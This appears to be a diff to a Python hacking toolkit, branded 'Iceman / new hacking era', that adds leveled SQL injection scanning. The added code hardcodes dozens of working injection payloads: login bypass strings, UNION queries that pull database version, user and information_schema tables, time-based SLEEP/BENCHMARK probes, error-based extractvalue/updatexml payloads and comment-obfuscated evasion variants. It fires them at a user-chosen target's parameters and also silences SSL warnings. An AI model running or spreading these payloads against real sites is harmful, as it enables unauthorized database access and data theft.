@@ -10,12 +10,21 @@ import urllib.request
 import urllib.parse
 import requests
 from datetime import datetime
+
+# ============================================================
+# SUPPRESS SSL WARNINGS
+# ============================================================
+import warnings
+warnings.filterwarnings("ignore")
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 import port_versions
 import xss_payloads
 import subdomains
 import admin_panels
 import directories
-import sql_payloads  # <-- ADD THIS IMPORT
+import sql_payloads
 
 R = '\033[91m'
 G = '\033[92m'
@@ -65,7 +74,7 @@ def main_menu():
   {G}[5]{RS} Admin Panel Finder
   {G}[6]{RS} Subdomain Scanner
   {G}[7]{RS} Directory Bruteforcer
-  {G}[8]{RS} SQL Injection Scanner  {R}← NEW!{RS}
+  {G}[8]{RS} SQL Injection Scanner
 
 {BR}INFORMATION:
   {G}[9]{RS} About
@@ -96,6 +105,18 @@ def xss_scanner_menu():
     print(f"  {G}[3]{RS} Hard Mode (Advanced XSS Detection)")
     print(f"  {G}[4]{RS} Extreme Mode (Full XSS Detection)")
     print(f"  {G}[5]{RS} Back to Main Menu")
+    print(f"\n{C}{'='*70}{RS}")
+    print(f"\n {BR}{G}┌──({C}Iceman{G}㉿{M}new hacking era!{G})-[~]{RS}")
+    print(f"{BR}{G}└─$ {RS}", end="")
+
+def sql_scanner_menu():
+    print(f"\n{C}{'='*70}{RS}")
+    print(f"{BR}{Y}{' ' * 20}SQL INJECTION SCANNER MENU{RS}")
+    print(f"{C}{'='*70}{RS}")
+    print(f"\n  {G}[1]{RS} Light Mode (Basic SQLi Detection)")
+    print(f"  {G}[2]{RS} Medium Mode (Advanced SQLi Detection)")
+    print(f"  {G}[3]{RS} Extreme Mode (Full SQLi Detection) {R}⚠️ SLOW!{RS}")
+    print(f"  {G}[4]{RS} Back to Main Menu")
     print(f"\n{C}{'='*70}{RS}")
     print(f"\n {BR}{G}┌──({C}Iceman{G}㉿{M}new hacking era!{G})-[~]{RS}")
     print(f"{BR}{G}└─$ {RS}", end="")
@@ -400,23 +421,84 @@ def custom_scan():
     run_port_scan(host, start, end, threads, show_version)
 
 # ============================================================
-# SQL INJECTION SCANNER (NEW)
+# SQL INJECTION SCANNER WITH LEVELS
 # ============================================================
 
 def sql_injection_scanner():
-    """SQL Injection Scanner using sql_payloads.py"""
+    """SQL Injection Scanner with Light/Medium/Extreme modes"""
+    while True:
+        clear()
+        banner()
+        sql_scanner_menu()
+        choice = input().strip()
+        
+        if choice == "1":
+            sql_scan_level('light')
+        elif choice == "2":
+            sql_scan_level('medium')
+        elif choice == "3":
+            sql_scan_level('extreme')
+        elif choice == "4":
+            break
+        else:
+            print(f"{R}[!]{RS} Invalid choice")
+            time.sleep(1)
+
+def sql_scan_level(level):
+    """Run SQL Injection scan at specified level"""
+    
+    # Define payload levels
+    light_payloads = [
+        "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' OR 'x'='x",
+        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT database()--",
+        "' UNION SELECT user()--", "' UNION SELECT @@version--", "' AND 1=1--",
+        "' AND 1=0--", "' AND SLEEP(5)--", "' OR 1=1 AND 1=1", "' OR 'admin'='admin",
+        "' OR 'password'='password", "' OR 'username'='username",
+    ]
+    
+    medium_payloads = [
+        "' OR '1'='1'#", "' OR '1'='1'/*", "' OR 1=1#", "' OR 1=1/*",
+        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
+        "' UNION SELECT table_name FROM information_schema.tables--",
+        "' UNION SELECT column_name FROM information_schema.columns--",
+        "' UNION SELECT schema_name FROM information_schema.schemata--",
+        "' UNION SELECT version()--", "' UNION SELECT current_user()--",
+        "' AND SLEEP(10)--", "' AND BENCHMARK(1000000,MD5('A'))--",
+        "' AND 1=CONVERT(int, @@version)--", "' AND extractvalue(1,concat(0x7e,@@version))--",
+        "' AND updatexml(1,concat(0x7e,@@version),1)--", "' OR 1=1-- -",
+        "' OR 1=1#", "' OR 1=1/*", "'/**/OR/**/1=1--", "'/*!OR*/1=1--",
+        "' UNIOn SELECT NULL--", "' Union Select NULL--",
+        "' OR 'admin'='admin'--", "' OR 'admin'='admin'#",
+    ]
+    
+    extreme_payloads = sql_payloads.get_sqli_payloads()
+    
+    if level == 'light':
+        payloads = light_payloads
+        mode_name = "LIGHT"
+        mode_color = G
+        params = ['id', 'page', 'user', 'q']
+    elif level == 'medium':
+        payloads = medium_payloads
+        mode_name = "MEDIUM"
+        mode_color = Y
+        params = ['id', 'page', 'user', 'q', 'search', 'login', 'email']
+    else:  # extreme
+        payloads = extreme_payloads
+        mode_name = "EXTREME"
+        mode_color = R
+        params = ['id', 'page', 'user', 'q', 'search', 'login', 'email', 'username', 'pass', 'pwd']
+    
     print(f"\n{C}{'='*70}{RS}")
-    print(f"{BR}{Y}{' ' * 20}SQL INJECTION SCANNER{RS}")
+    print(f"{BR}{mode_color}{' ' * 20}SQL INJECTION SCANNER - {mode_name} MODE{RS}")
     print(f"{C}{'='*70}{RS}")
     
     target = get_target()
     
-    # Get payloads from sql_payloads module
-    payloads = sql_payloads.get_sqli_payloads()
-    print(f"{G}[*] Loaded {len(payloads)} SQL injection payloads{RS}")
-    
-    params = ['id', 'page', 'user', 'q', 'search', 'login', 'email', 'username', 'pass', 'pwd']
-    print(f"{G}[*] Testing {len(params)} parameters{RS}")
+    print(f"{G}[*] Mode:{RS} {mode_color}{mode_name}{RS}")
+    print(f"{G}[*] Payloads:{RS} {len(payloads)}")
+    print(f"{G}[*] Parameters:{RS} {len(params)}")
+    print(f"{G}[*] Started:{RS} {datetime.now().strftime('%H:%M:%S')}")
     print(f"{C}{'-'*60}{RS}")
     
     vulnerabilities = []
@@ -451,7 +533,7 @@ def sql_injection_scanner():
                 pass
     
     print(f"\n\n{C}{'='*70}{RS}")
-    print(f"{BR}{G}SCAN COMPLETE{RS}")
+    print(f"{BR}{G}SCAN COMPLETE - {mode_name} MODE{RS}")
     print(f"{C}{'='*70}{RS}")
     print(f"{G}Tests:{RS} {total_tests}")
     print(f"{G}Vulnerabilities:{RS} {BR}{Y}{len(vulnerabilities)}{RS}")
@@ -466,10 +548,11 @@ def sql_injection_scanner():
         
         save = input(f"\n{Y}[?]{RS} Save results? (y/n): ").strip().lower()
         if save == 'y':
-            filename = f"sqli_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            filename = f"sqli_{mode_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
             with open(filename, 'w') as f:
                 f.write(f"SQL Injection Scan Results\n")
                 f.write(f"Target: {target}\n")
+                f.write(f"Mode: {mode_name}\n")
                 f.write(f"Date: {datetime.now()}\n")
                 f.write(f"Total Tests: {total_tests}\n")
                 f.write(f"Vulnerabilities Found: {len(vulnerabilities)}\n")
@@ -486,7 +569,7 @@ def sql_injection_scanner():
     input(f"\n{C}Press Enter to continue...{RS}")
 
 # ============================================================
-# EXISTING FUNCTIONS
+# XSS SCANNER FUNCTIONS
 # ============================================================
 
 def test_xss_payload(url, payload, params):
@@ -1128,7 +1211,7 @@ def about():
     print(f"  {G}• Admin panel finder (600+ paths){RS}")
     print(f"  {G}• Subdomain scanner (1000+ subdomains){RS}")
     print(f"  {G}• Directory bruteforcer (1000+ directories){RS}")
-    print(f"  {G}• SQL Injection scanner (500+ payloads){RS}")
+    print(f"  {G}• SQL Injection scanner (Light/Medium/Extreme){RS}")
     print(f"  {G}• 100+ XSS payloads{RS}")
     print(f"  {G}• Progress tracking with ETA{RS}")
     print(f"  {G}• Save results to file{RS}")
